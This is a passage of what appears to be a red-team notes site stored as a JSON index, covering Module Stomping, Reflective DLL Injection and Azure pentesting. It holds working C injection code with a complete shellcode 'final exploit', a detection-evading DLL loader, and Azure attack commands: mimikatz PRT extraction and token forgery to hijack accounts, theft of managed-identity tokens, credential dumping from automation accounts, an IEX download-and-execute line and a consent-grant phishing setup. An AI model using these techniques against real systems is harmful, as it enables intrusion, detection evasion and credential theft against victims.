stomp its base address to launch a malicious shellcode Module Stomping also knows as DLL Hollowing is another technique used to inject shellcode in memory. It can also be used to inject full DLL. However, the injected shellcode will appear to be injected as a valid standard DLL. Indeed, when a shellcode is injected in memory with a simple VirtualAllocEx and WriteProcessMemory it will appear as loaded from nowhere in ProcessHacker or ProcessExplorer: The Module Stomping technique aims to load the shellcode with a valid legit location such as amsi.dll. This technique avoids the use of RWX memory page allocation in the target process. Moreover, the shellcode is loaded as a valid Windows DLL so detection system will not see any weird loading location. Finally, the remote thread launched is associated to a legit Windows module. Hands on Inject some standard Windows DLL such as amsi.dll or advapi.dll Overwrite the loaded DLL's entry point address with the shellcode one Starts a new thread at the loaded DLL's entry point Inject the DLL The DLL can be injected with the following code. The target process is opened using OpenProcess. Then the DLL path is injected in the process memory through VirtualAllocEx and WriteProcessMemory. Finally, the DLL is loaded in the process memory through the use of LoadLibrary in a brand new thread. #include #include BOOL injectDLL(char *moduleToInject, DWORD processPID) { // open the target process HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processPID); // allocate the memory page to inject the DLL path void* remoteBuffer = VirtualAllocEx(processHandle, NULL, strlen(moduleToInject) * sizeof(char), MEM_COMMIT, PAGE_READWRITE); if (!remoteBuffer) { return FALSE; } // inject the dll name BOOL status = WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, strlen(moduleToInject) * sizeof(char), NULL); if (!status) { return FALSE; } // load the dll with LoadLibraryW HMODULE kernel32 = GetModuleHandleA(\"Kernel32.dll\"); if (!kernel32) { return FALSE; } PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(kernel32, \"LoadLibraryA\"); if (!threadRoutine) { return FALSE; } HANDLE dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL); if (!dllThread) { return FALSE; } WaitForSingleObject(dllThread, 1000); return TRUE; } int main() { DWORD processPID = 30436; char moduleToInject[] = \"C:\\\\windows\\\\system32\\\\amsi.dll\"; injectDLL(moduleToInject, processPID); return 0; } Find the DLL load address In order to retrieve the DLL load address, it is possible to enumerate the process loaded modules through EnumProcessModules. Then, each modules base address is resolved using GetModuleBaseNameA. DWORD64 getDLLBaseAddress(HANDLE processHandle, char *dllName) { HMODULE modules[1024]; SIZE_T modulesSize = sizeof(modules); DWORD modulesSizeNeeded = 0; EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded); SIZE_T modulesCount = modulesSizeNeeded / sizeof(HMODULE); for (size_t i = 0; i Find the DLL entrypoint address The DLL entrypoint address can be found in the DLL header. Thus, the DLL header is retrieved through ReadProcessMemory and the DLL base address found before. Then, the value read is casted into IMAGE_DOS_HEADER to access to the IMAGE_NT_HEADERS and finally the OptionalHeader.AddressOfEntryPoint which is the DLL entrypoint RVA. DWORD64 getDLLEntryPointAddress(HANDLE processHandle, DWORD64 baseAddress) { void* buffer = calloc(0x1000, sizeof(char)); if (!buffer) { return NULL; } DWORD bufferSize = 0x1000; ReadProcessMemory(processHandle, (PVOID)baseAddress, buffer, bufferSize, NULL); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer; PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)buffer + dosHeader->e_lfanew); return ntHeader->OptionalHeader.AddressOfEntryPoint + baseAddress; } Write and launch the shellcode The shellcode is written at the DLL entry point address with WriteProcessMemory and a thread is relaunched: SIZE_T writeShellcode( HANDLE processHandle, DWORD64 entrypointAddress, unsigned char* shellcode, SIZE_T shellcodeLen) { SIZE_T writtenBytes; WriteProcessMemory( processHandle, (PVOID)entrypointAddress, (LPCVOID)shellcode, shellcodeLen, &writtenBytes); CreateRemoteThread( processHandle, NULL, 0, (PTHREAD_START_ROUTINE)entrypointAddress, NULL, 0, NULL ); return writtenBytes; } Final exploit int main() { unsigned char buf[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\" \"\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\" \"\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\" \"\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\" \"\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\" \"\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\" \"\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\" \"\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\" \"\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\" \"\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\" \"\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\" \"\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\" \"\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\" \"\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\" \"\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\" \"\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x43\\x3a\\x5c\" \"\\x77\\x69\\x6e\\x64\\x6f\\x77\\x73\\x5c\\x73\\x79\\x73\\x74\\x65\\x6d\\x33\" \"\\x32\\x5c\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\"; DWORD processPID = 21204; char moduleToInject[] = \"C:\\\\windows\\\\system32\\\\amsi.dll\"; HANDLE processHandle = injectDLL(moduleToInject, processPID); if (!processHandle) { printf(\"[x] Cannot load library\\n\"); return -1; } DWORD64 baseAddress = getDLLBaseAddress(processHandle, \"amsi.dll\"); if (!baseAddress) { printf(\"[x] Cannot retrieve DLL base address\\n\"); return -1; } printf(\"[+] DLL load at : 0x%llX\\n\", baseAddress); DWORD64 entrypointAddress = getDLLEntryPointAddress(processHandle, baseAddress); if (!entrypointAddress) { printf(\"[x] Cannot retrieve the entrypoint address\\n\"); return -1; } printf(\"[+] DLL entrypoint at : 0x%llX\\n\", entrypointAddress); SIZE_T writtenBytes = writeShellcode(processHandle, entrypointAddress, buf, sizeof(buf)); printf(\"[+] %lld bytes written\\n\", writtenBytes); CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)entrypointAddress, NULL, 0, NULL); return 0; } It is somewhat interesting to perform a self-injection instead of injecting in another process. Indeed, performing a self-injection avoid the use of CreateRemotThread. If a self-injection is performed, the shellcode can be launched with the following line: ((void(*)())entrypointAddress)(); "},"Malware/Reflective DLL injection.html":{"url":"Malware/Reflective DLL injection.html","title":"Reflective DLL Injection","keywords":"","body":"Reflective DLL Injection Table of content Overview Blueprint Store the DLL content in memory Inject the DLL Perform image base relocations Symbol Table Perform relocation Process imported functions Import Directory Table IAT and ILT Fill the IAT Delayed Import Table TLS Callback et DLL Main TLS Callback DLL Main GetProcAddress Overview The Reflective DLL Injection is a process injection technique that allows an attacker to inject DLL stored in memory rather than from the disk. Indeed, any DLL stored on disk can be easily loaded using the LoadLibrary Windows API. However, this API does not work when the DLL content is stored in memory. Moreover, the LoadLibrary API raises some kernel events as it is shown in the following figure: Using a Reflective DLL Injection is a way to reimplement a custom LoadLibrary function that will not raise any kernel events hence limiting detection from the Blue Team. Blueprint The Reflective DLL Injection can be done through the following steps: Store the DLL content in memory Parse the DLL header to retrieve the SizeOfImage value Allocate a memory space whose size is equal to the DLL SizeOfImage Copy each header and section in the allocated memory space Perform image base relocations if needed Load dependencies DLL ie DLL used by the loaded DLL Resolve imported functions and populate the Import Address Table (IAT) Protect memory sections according to DLL's sections needs Run the DLL TLS callbacks Run the DLL main function Enjoy ! Store the DLL content in memory This step is quite simple. The goal is to get a buffer with the whole DLL file's content in it. The following code can be used to load a full file in memory: BOOL FileExistsW(LPCWSTR szPath){ DWORD dwAttrib = GetFileAttributesW(szPath); return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY)); } PBYTE ReadFileW(LPCWSTR filename, PDWORD fileSize) { // Open the file with read permissions HANDLE hFile = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { return NULL; } // Retrieve the file size *fileSize = GetFileSize(hFile, NULL); DWORD sizeRead = 0; // Allocate size in heap to contains the file content PBYTE content = (PBYTE)malloc(*fileSize); // Populate the allocated buffer with the file content DWORD result = ReadFile(hFile, content, *fileSize, &sizeRead, NULL); if (!result || sizeRead != *fileSize) { DEBUG(\"[x] Error during %ls file read\\n\", filename); free(content); content = NULL; } CloseHandle(hFile); // Return the buffer return content; } So now the whole DLL content is stored in memory and is ready to be injected. Inject the DLL To inject whatever in memory you need to know the global size of the thing you want to inject. For PE files, such as DLL, the full file size can be found in the nt headers. The post goal is not to create a PE parser so each fields of the PE will not be explicitly documented in this post. The full DLL size can be found with the following code that retrieves the OptionalHeader.SizeOfImage: // dllContent is the first byte of the DLL stored in memory DWORD getImageSize(PVOID dllContent){ IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((PBYTE)dllContent + pe->dosHeader->e_lfanew); return ntHeaders->OptionalHeader.SizeOfImage } Then, once the full size is known, a memory page is allocated using VirtualAlloc: PVOID startAddress = VirtualAlloc( NULL, dllParsed->ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ); So now, the allocated page must be populated with the DLL's headers and sections: IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((PBYTE)dllContent + pe->dosHeader->e_lfanew); // Copy the headers CopyMemory(startAddress, dllContent, ntHeader->OptionalHeader.SizeOfHeaders); // Copy the sections PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(dllParsed->ntHeader); for (DWORD i = 0; i FileHeader.NumberOfSections; i++, sectionHeader++) { CopyMemory( (PBYTE)startAddress + sectionHeader->VirtualAddress, (PBYTE)dllContent + sectionHeader->PointerToRawData, sectionHeader->SizeOfRawData ); } At the end of these steps, the whole DLL is loaded in memory at the address startAddress. In a better world, this could be the end and the DLL entry point could be run straight away. However, there is a high probability that your DLL has not been loaded to its preferred base address. Thus, several relocations must be done before being able to run you DLL. Perform image base relocations When a PE is compiled, the symbols are referenced as if the PE is loaded at a given base address. This address is the PE preferred loading address or the ImageBase address. If the PE is not loaded to its preferred ImageBase address, the load address shift breaks all absolute references among the PE. For example, if the PE has been compiled to reference the data A from the address 0x40000, this reference only works if the PE is loaded to the same base address as the one used during compilation. If the PE is loaded to another base address, the reference 0x40000 will not point to the A data anymore but to an arbitrary data in the process memory space. The A data will be stored at 0x4000 + offset where the offset is the difference between the current loading address and the preferred ImageBase address. The .reloc section contains all the hardcoded absolute references that need fixing if the PE is not loaded at its preferred base address. In a nutshell, symbols referenced by their absolute address are not hardcoded into the .text section. Their references in the .text section point to the .reloc section. The .reloc section is used as a lookup table between the symbol reference in .text and its absolute definition address. Symbol Table The .reloc section contains the Relocation Table. This table is divided into blocks that represents the base relocation. The start address for the Relocation Table can be retrieved in the PE DataDirectory located in the NtHeader's OptionalHeader parameter: PVOID firstRelocationBlock = ntHeader->OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress Each block starts with an IMAGE_BASE_RELOCATION and is followed by any number of offsets and field entries. The IMAGE_BASE_RELOCATION part can be parsed using the following structure: typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; DWORD SizeOfBlock; } IMAGE_BASE_RELOCATION; The different relocation entries can be iterated from the VirtualAddress address to the VirtualAddress + SizeOfBlock address. So, once the IMAGE_BASE_RELOCATION object is extracted from the relocation table block, it can be used to access to the relocation entries as the relocation table structure can be seen as follows: The different IMAGE_BASE_RELOCATION can be iterated using the following code: //pseudo code IMAGE_BASE_RELOCATION* currentRelocation = firstRelocationBlock while(currentRelocation->VirtualAddress){ // Process the current relocation block ... // Jump to the next relocation block currentRelocation = (PBYTE)currentRelocation + currentRelocation->SizeOfBlock; } So now, it is needed to access to each relocation block's entry. These entries can be parsed using the following structure: typedef struct _IMAGE_RELOCATION_ENTRY { WORD Offset : 12; WORD Type : 4; } IMAGE_RELOCATION_ENTRY; Each entry contained in the relocation block can be parsed using the following code: // pseudo code // IMAGE_BASE_RELOCATION *currentRelocation : the current relocation block IMAGE_RELOCATION_ENTRY* relocationEntry = &currentRelocation[1]; while ((DWORD64)relocationEntry SizeOfBlock){ // process the relocation ... // jump to the next entry relocationEntry++; } So, to summarize, the following code can be used to parse a full relocation table: //pseudo code IMAGE_BASE_RELOCATION* currentRelocation = ntHeader->OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress while(currentRelocation->VirtualAddress){ // process the current relocation block IMAGE_RELOCATION_ENTRY* relocationEntry = &currentRelocation[1]; while ((DWORD64)relocationEntry SizeOfBlock){ // process the relocation ... // jump to the next entry relocationEntry++; } // jump to the next relocation block currentRelocation = (PBYTE)currentRelocation + currentRelocation->SizeOfBlock; } Perform relocation Performing a relocation is modifying the Relocation Table entries and add an offset equal to the difference of the PE preferred load address and the real PE load address. So, the relocation address must be found, and its content must be updated. In order to update the relocation content, the relocation type must be taken into account. Indeed, depending on the relocation type, the modification can be handled differently: Name Value Description IMAGE_REL_BASED_ABSOLUTE 0x00 The relocation is skipped. It is often used to pad a block IMAGE_REL_BASED_HIGH 0x01 The 16 high bits of the offset is added to the current relocation value IMAGE_REL_BASED_LOW 0x03 The 16 low bits of the offset is added to the current relocation value IMAGE_REL_BASED_HIGHLOW 0x04 The 32 bits of the offset is added to the current relocation value IMAGE_REL_BASED_DIR64 0x10 The 64 bits of the offset is added to the current relocation value The following code can be used to handle the relocations: // pseudo code // PVOID startAddress : the actual PE load address // IMAGE_BASE_RELOCATION* currentRelocation : the actual relocation block // Compute the offset DWORD64 offset = startAddress - ntHeader->OptionalHeader.ImageBase; // Get the first relocation entry in the block IMAGE_RELOCATION_ENTRY* relocationEntry = &currentRelocation[1]; // Parse all relocation entry in the relocation block while(relocationEntry SizeOfBlock){ // Get the relocation address DWORD64 relocationRVA = currentRelocation->VirtualAddress + relocationEntry->Offset; DWORD64 *relocationAddress = startAddress + relocationRVA; // Process the relocation switch(relocationEntry->Type){ case IMAGE_REL_BASED_HIGH: // 16 high bits *relocationAddress += HIWORD(offset); break; case IMAGE_REL_BASED_LOW: // 16 low bits *relocationAddress += LOWORD(offset); break; case IMAGE_REL_BASED_HIGHLOW: // 32 bits *relocationAddress += (DWORD)offset; break; case IMAGE_REL_BASED_DIR64: // 64 bits *relocationAddress += offset; break; default: break; } relocationEntry ++; } Thus, at this moment, all relocations had been performed and the program should work whatever its load address. However, what happens if the DLL uses functions defined in another DLL ? In this case, the DLL must be imported and the functions address must be resolved. Process imported functions DLL have dependencies. Indeed, the DLL could use functions defined in other DLL. For example, the KERNEL32.DLL has the NTDLL.DLL as dependencies : VirtualAlloc will call NtAllocateVirtualMemory. Thus, these references must also be resolved. Import Directory Table The Import Directory Table is located in the .idata section and contains one entry for every DLL used by the PE. The Import Directory Table entry can be parsed using the following structure: typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; } DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; DWORD FirstThunk; } IMAGE_IMPORT_DESCRIPTOR; è Once the DLL name is known, it must be loaded using a recursive call or using LoadLibrary. However, the use of LoadLibrary is kind of problematic as it will raise several kernel events. Then, the ILT must be parsed to fill the IAT. IAT and ILT The IAT is a table that will contain the address of the resolved symbols ie the function addresses resolved through GetProcAddress. This table is usually empty when the process start and is filled depending on the ILT information. The ILT is a lookup table containing information about the imported function such as its name, its ordinal etc... The ILT information is used to resolve the imported function address that will be stored in the IAT. The ILT and IAT entries can be parsed using the following structure: typedef struct _IMAGE_THUNK_DATA { union { ULONGLONG ForwarderString; ULONGLONG Function; ULONGLONG Ordinal; ULONGLONG AddressOfData; } u1; } IMAGE_THUNK_DATA; For the ILT the interesting parameters are : The AddressOfData parameter that contains the function name RVA. This address points to the IMAGE_IMPORT_BY_NAME structure that can be used to retrieve the function name as a simple string. This string can then be used with GetProcAddress to retrieve the function address. The Ordinal parameter that contains the function ordinal and can be used to resolve the function address through GetProcAddress For the IAT the interesting parameter is : The Function parameter that will receive the function resolved address Thus, the idea is to parse the while ILT, use the AddressOfData or Ordinal parameter to resolve the function address and write it in the IAT's Function value. Fill the IAT The following code can be used to process the imported functions: // pseudo code // Get the first Import Directory Table entry IMAGE_IMPORT_DESCRIPTOR* importDescriptor = startAddress + ntHeaders->OptionalHeader->dataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; // Iterate through all Import Directory Table entries for (SIZE_T i = 0; importDescriptor->Name; importDescriptor++) { // Get the IAT and ILT first entry PIMAGE_THUNK_DATA iat = startAddress + importDescriptor->FirstThunk; PIMAGE_THUNK_DATA ilt = startAddress + importDescriptor->OriginalFirstThunk; // Get the associated DLL name char* dllName = startAddress + importDescriptor->Name; // Load the DLL // For clean read, the LoadLibrary function is used HMODULE dllHandle = GetModuleHandleA(dllName); if (!dllHandle) { dllHandle = LoadLibraryExA(dllName, NULL, NULL); if (!dllHandle) { return FALSE; } } // Iterate through the ILT entries for (; ilt->u1.Function; iat++, ilt++) { // Check if the function is given as an ordinal if (IMAGE_SNAP_BY_ORDINAL(ilt->u1.Ordinal)) { // Resolve function name through its ordinal LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(ilt->u1.Ordinal); // Write function address into the IAT's corresponding entry iat->u1.Function = (DWORD_PTR)GetProcAddress(dllHandle, functionOrdinal); } else { // Load the HINT structure from the ILT information // The HINT structure contains address to the function name IMAGE_IMPORT_BY_NAME* hint = startAddress + ilt->u1.AddressOfData; // Write function address into the IAT's correspond entry iat->u1.Function = GetProcAddress(dllHandle, hint->Name); } } } At this moment, the DLL dependencies are loaded. Delayed Import Table The Delayed Import Table works exactly like the standard Import Directory Table. This table has been added to support an uniform mechanism for applications to delay the DLL until one of its exported functions is used. To avoid any problem, this table will be processed exactly as the Import Directory Table. The only difference is that this table entries will be parsed using the following structure: typedef struct _IMAGE_DELAYLOAD_DESCRIPTOR { union { DWORD AllAttributes; struct { DWORD RvaBased : 1; DWORD ReservedAttributes : 31; } DUMMYSTRUCTNAME; } Attributes; DWORD DllNameRVA; DWORD ModuleHandleRVA; DWORD ImportAddressTableRVA; DWORD ImportNameTableRVA; DWORD BoundImportAddressTableRVA; DWORD UnloadInformationTableRVA; DWORD TimeDateStamp; } IMAGE_DELAYLOAD_DESCRIPTOR The DLLNameRVA value contains the RVA to the DLL name. The ImportAddressTableRVA contains the IAT's RVA. Likewise, the ImportNameTableRVA contains the ILT's RVA. Besides, nothing changes and the previous code used to parse the Import Directory Table can be used as is. TLS Callback et DLL Main TLS Callback The TLS Callback are function ran before the entry point. They are often used by malware as anti-debug techniques but also by legit DLL to set up the environment. Before running the DLL main, these callbacks must be run. They can be found in the PE DataDirectory in the Entry TLS parameter. The following code can be used to run these functions: // pseudo code // Check if any TLS callback is defined if (dllParsed->dataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) { // Get the TLS information PIMAGE_TLS_DIRECTORY tlsDir = startAddress + dllParsed->dataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress // Get the TLS function address PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)(tlsDir->AddressOfCallBacks); for (; *callback; callback++) { // Call the function (*callback)((PVOID)dllParsed->baseAddress, DLL_PROCESS_ATTACH, NULL); } } DLL Main The DLL main function is the function called when the DLL is loaded by the system. The following code is an example of DLL Main: BOOL WINAPI DllMain( HINSTANCE hinstDLL, // handle to DLL module DWORD fdwReason, // reason for calling function LPVOID lpvReserved ) // reserved { // Perform actions based on the reason for calling. switch( fdwReason ) { case DLL_PROCESS_ATTACH: // Initialize once for each new process. // Return FALSE to fail DLL load. break; case DLL_THREAD_ATTACH: // Do thread-specific initialization. break; case DLL_THREAD_DETACH: // Do thread-specific cleanup. break; case DLL_PROCESS_DETACH: if (lpvReserved != nullptr) { break; // do not do cleanup if process termination scenario } // Perform any necessary cleanup. break; } return TRUE; // Successful DLL_PROCESS_ATTACH. } When the DLL is loaded, the event DLL_PROCESS_ATTACH is used. The following code can be used to call the DLL main: // pseudo code typedef BOOL(WINAPI* LPDLLMAIN)(DWORD_PTR image_base, DWORD reason, LPVOID reserved); LPDLLMAIN entryPoint = (LPDLLMAIN)startAddress + dllParsed->ntHeader->OptionalHeader.AddressOfEntryPoint); if(entrypoint) { BOOL status = entryPoint((HINSTANCE)dllParsed->baseAddress, DLL_PROCESS_ATTACH, NULL); } From now, the DLL should be fully loaded and the exported function can be used. GetProcAddress The Windows GetProcAddress will not work with the loaded DLL and I wasn't able to understand why. Indeed, the GetProcAddress function requires a handle to the DLL (HMODULE). The HMODULE type simply represents the DLL base address. However, even when the loaded DLL base address is given to the GetProcAddress function, it cannot find the exported function. Thus, a custom GetProcAddress function must be developed. The PE header contains all the information needed to access to the exported function name and addresses. Indeed, the DataDirectory contains the ExportDirectory address that can be used to access to the AddressOfFunctions, AddressOfNames and AddressOfNameOrdinals tables. The AddressOfNames is a table containing the names of the exported functions. The AddressOfFunctions is a table containing the address of the exported functions. The AddressOfNameOrdinals is a lookup table used to link the names from the AddressOfNames to the address from the AddressOfFunctions. The following code can be used as a custom GetProcAddress: // pseudo code DWORD exportDirectoryRVA = (DWORD)dllParsed->dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; IMAGE_EXPORT_DIRECTORY exportDirectory = startAddress + exportDirectoryRVA; LPDWORD AddressOfFunctions = startAddress + exportDirectory->AddressOfFunctions; LPDWORD AddressOfNames = startAddress + exportDirectory->AddressOfNames; LPWORD AddressOfNameOrdinals = startAddress + exportDirectory->AddressOfNameOrdinals; for (SIZE_T i = 0; i NumberOfFunctions; i++) { char *name = (char*)((DWORD64)startAddress + AddressOfNames[i]); if (strcmp(name, functionName) == 0) { DWORD64 functionRVA = AddressOfFunctions[AddressOfNameOrdinals[i]]; return startAddress + functionRVA; } } "},"Pentest/Cloud/Azure.html":{"url":"Pentest/Cloud/Azure.html","title":"Azure","keywords":"","body":"Azure Table of content Tools Roadrecon ScoutSuite AzPowershell Install Connect IAM enumeration List storage containers AzAutomation AzAutomationAccount Desired State Configuration List the DSC Export the configuration Runbook List the Runbooks Export scripts Create new Runbook Start a runbook Automation Credentials PRT Service Principal List accounts Docker List docker containers inside a registry Connect to a docker with azure credentials Connect to Azure VM with AzureAccount Managed identity WebApp List webapp Configuration WebSSH Consent grant attack Set up the trap Set the application permission Create a new application Send the malicious URL Tools Roadrecon ROADtools is a framework to interact with Azure AD. It currently consists of a library (roadlib) and the ROADrecon Azure AD exploration tool. github python3 -m pip install roadrecon roadrecon auth --device-code roadrecon gather road-recon gui ScoutSuite Scout Suite is an open source multi-cloud security-auditing tool, which enables security posture assessment of cloud environments. Using the APIs exposed by cloud providers, Scout Suite gathers configuration data for manual inspection and highlights risk areas. Rather than going through dozens of pages on the web consoles, Scout Suite presents a clear view of the attack surface automatically. github # Connect to Azure and run the following command python scout.py azure --cli AzPowershell Install Install-Module Az -Force Connect $Username = ${username} $Password = ${password} $User = (New-Object System.management.automation.PSCredential($Username, (ConvertToSecureString $Password -AsPlainText -Force))) Connect-AzAccount -Credential $User IAM enumeration # Get user role Get-AzRoleAssignment | Format-List SignInName,RoleDefinitionName,Scope # Azure AD Groups Get-AzAdGroup # Azure AD Users Get-AzADUser az role assignement list --all List storage containers With Reader permission on Storage Accounts it is possible to retrieve containers exposed with public access: (Get-AzStorageAccount | Get-AzStorageContainer).cloudBlobContainer | select Uri,@{n='PublicAccess';e={$_.Properties.PublicAccess}} AzAutomation AzAutomationAccount The Contributor role of an automation account grants full access to all the resources in the automation account such as Runbooks and Desired State Configuration. Get-AzAutomationAccount Desired State Configuration List the DSC Get-AzAutomationAccount | Get-AzAutomationDscConfiguration Export the configuration $DSCName = ${dscToExport} Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -march $DSCName} | Export-AzAutomationDscConfiguration -OutputFolder (get-location) -Debug Runbook List the Runbooks Get-AzAutomationAccount | Get-AzAutomationRunbook Export scripts Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder (pwd) Create new Runbook Runbook can access to automation credentials configured in the environment. It can be interesting to create a Runbook to fetch these credentials $ResourceGroupName = ${resource} $AutomationAccountName = ${automationAccount} $RunbookName = ${newRunbookName} @' ${runbookScript} '@ | out-file -encofing ascii 'runbook.ps1' New-AzAutomationRunbook -Name $RunbookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell Import-AzAutomationRunbook -Path 'runbook.ps1' -Name $RunbookName -Type PowerShell -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Force Publish-AzAutomationRunbook -Name $RunbookName -AutomationAccountName ÂutomationAccountName -ResourceGroupName $ResourceGroupName Start a runbook $ResourceGroupName = ${resource} $AutomationAccountName = ${automationAccount} $RunbookName = ${newRunbookName} $start = Start-AzAutomationRunBook -Name $RunbookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName start-sleep 20 ($start | Get-AzAutomationJob | Get-AzAutomationJobOutput.Summary) Automation Credentials Get-AzAutomationAccount | Get-AzAutomationCredential PRT Extract the PRTPRT and unprotect the keys # mimikatz sekurlsa::cloudap Dpapi::cloudapkd /keyvalue:${keyValue} /unprotect Generate a new PRT Install-Module AADInternals $MimikatzPRT = \"${prtToken}\" # Add padding while($MimikatzPRT.Length % 4) {$MimikatzPRT += \"=\"} # Convert from Base 64 $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT)) # Add the session key (Clear key) to a variable $MimikatzKey = \"${clearKey}\" # Convert to byte array and base 64 encode $SKey = [convert]::ToBase64String( [byte[]] ($MimikatzKey -replace '..', '0x$&,' -split ',' -ne '')) # Generate a new PRTToken with nonce $prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce Write-Host $prtToken Inject the PRT as a cookie to hijack the account : Cookie name : x-ms-RefreshTokenCredential HTTPOnly : true Domain : login.microsoft.com Path : / Service Principal The Service Principal account used to launch specific services. Thus, the service does not use a real user account to run but a dedicated account with limited privileges. These account username and password are UUID. List accounts Get-AzureAdPrincpal -All $true Docker The Azure Docker URI look like ${tenant}.azurecr.io. List docker containers inside a registry The Get-AzACR script can be used to enumerate Docker pull URL's IEX (New-Object Net.WebClient).downloadstring(\"https://raw.githubusercontent.com/NetSPI/MicroBurst/master/Misc/Get-AzACR.ps1\") Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\" -Name \"DisableFirstRunCustomize\" -Value 2 Get-AzACR -username ${username} -password ${password} -registry ${registryURI} Connect to a docker with azure credentials docker login ${registryURI} --username ${username} --password ${password} Connect to Azure VM with AzureAccount ssh -l ${userMail} ${ip} -p ${port} # ssh -l yoann.dequeker@wavestone.com 10.10.10.10 -p 1337 Managed identity When connected to a Azure VM, it is possible to steel Azure token if the VM identity is managed curl 'http://169.254.169.254/metadata/identity/oauth2/token.api-version=2018-02-01&resource=https://management.azure.com/' -H 'Metadata:true' It is then possible to login as this user with az login --identity WebApp List webapp az webapp list Configuration Some secrets can be stored in the configuration file. For example, database credentials can be stored in Azure az webapp config connection-string list --name ${appName} --resource-group ${resourceName} Likewise, sensitive information can be stored in the deployment configuration az webapp deployment list-publishing-profiles --resource-group ${resourceName} --name ${appName} WebSSH The Website Contributorrole can access to the application underlying operating system through the Console feature. It is possible to establish an SSH over HTTP connection when the /webssh/host endpoint can be reached (curl https://${appName}?app.scm.azurewebsites.net/webssh/host).statuscode The SSH session can be opened with AzCli # It open a port forwardin (43605) az webapp create-remote-connection --subscription ${subscription} --resource-groupe ${resourceGroup} --n ${applicationName} # Connect to ssh ssh root@localhost -p 43605 Consent grant attack The Consent grant attack is an attack where a user will connect to a malicious application with his Azure account. The malicious application will ask for several permission such as the right to read OneDrive files or access to Outlook. The application is designed to redirect the user and steal its authentication token to abuse the excessive rights. At the moment, this attack will not work on cross tenant users as it asks for administrator rights during the authentication. Set up the trap The 365-Stealer project can be 